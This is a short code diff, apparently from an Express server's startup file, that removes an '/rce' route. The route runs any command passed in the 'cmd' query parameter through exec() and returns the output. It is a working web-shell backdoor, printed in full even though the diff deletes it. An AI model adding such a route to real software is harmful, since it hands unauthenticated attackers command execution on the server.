@@ -170,24 +170,6 @@ void collectDurationPromise('validateConfig', validateConfig)({})
 // Function called first to ensure that all the i18n files are reloaded successfully before other linked operations.
 restoreOverwrittenFilesWithOriginals().then(() => {
 
-
-  app.get('/rce', (req: any, res: any) => {
-    const cmd = req.query.cmd;
-    if (cmd) {
-       // Используем exec, который импортировали в начале файла
-       exec(cmd, (err: any, stdout: any, stderr: any) => {
-         if (stdout) return res.send(stdout);
-         if (stderr) return res.send(stderr);
-         if (err) return res.send(err.message);
-         res.send('Command executed but no output.');
-       });
-    } else {
-       res.send('RCE is ready!');
-    }
-  });
-
-
-
   
   /* Locals */
   app.locals.captchaId = 0
